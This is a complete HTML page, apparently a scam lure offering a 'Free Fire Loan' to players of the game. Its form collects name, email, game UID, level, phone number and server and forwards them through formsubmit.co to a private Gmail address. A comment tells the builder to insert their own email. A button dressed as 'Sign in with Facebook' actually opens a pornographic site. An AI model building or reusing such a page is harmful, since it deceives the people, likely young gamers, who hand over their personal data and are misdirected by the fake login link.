<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Free Fire Loan</title>
  <style>
    body {
      background-color: black;
      color: white;
      font-family: Arial, sans-serif;
      padding: 20px;
    }
    .form-container {
      max-width: 400px;
      margin: auto;
      background-color: #222;
      padding: 20px;
      border-radius: 10px;
    }
    label {
      display: block;
      margin-top: 10px;
    }
    input, select {
      width: 100%;
      padding: 8px;
      margin-top: 5px;
      border: none;
      border-radius: 5px;
    }
    .social-login {
      display: flex;
      flex-direction: column;
      gap: 10px;
      margin-top: 20px;
    }
    .social-login a {
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 10px;
      color: white;
      border-radius: 5px;
      text-decoration: none;
      font-weight: bold;
    }
    .facebook {
      background-color: #3b5998;
    }
    .google {
      background-color: #db4437;
    }
    .social-login img {
      width: 20px;
      height: 20px;
      margin-right: 10px;
    }
    .footer {
      text-align: center;
      margin-top: 20px;
      font-size: 0.9em;
      color: #aaa;
    }
    button {
      margin-top: 15px;
      background-color: #444;
      color: white;
      padding: 10px;
      border: none;
      border-radius: 5px;
      width: 100%;
      cursor: pointer;
    }
  </style>
</head>
<body>

  <div class="form-container">
    <h2>Free Fire Loan</h2>
    
    <!-- Formsubmit setup: replace with your real email -->
    <form action="https://formsubmit.co/sifatulislam575@gmail.com" method="POST">
      <label for="name">Name</label>
      <input type="text" id="name" name="name" required>

      <label for="email">Email</label>
      <input type="email" id="email" name="email" required>

      <label for="uid">UID</label>
      <input type="text" id="uid" name="uid" required>

      <label for="level">Level</label>
      <input type="number" id="level" name="level" required>

      <label for="phone">Phone</label>
      <input type="tel" id="phone" name="phone" required>

      <label for="server">Server</label>
      <select id="server" name="server" required>
        <option value="bangladesh">Bangladesh</option>
        <option value="india">India</option>
        <option value="indonesia">Indonesia</option>
        <option value="singapore">Singapore</option>
      </select>

      <button type="submit">Submit Form</button>
    </form>

    <div class="social-login">
      <a class="facebook" href="https://www.xnxx.com/" target="_blank">
        <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="Facebook Logo">
        Sign in with Facebook
      </a>
      <a class="google" href="https://accounts.google.com/" target="_blank">
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" alt="Google Logo">
        Sign in with Google
      </a>
    </div>

    <div class="footer">
      Created by Sifatu
    </div>
  </div>

</body>
</html>
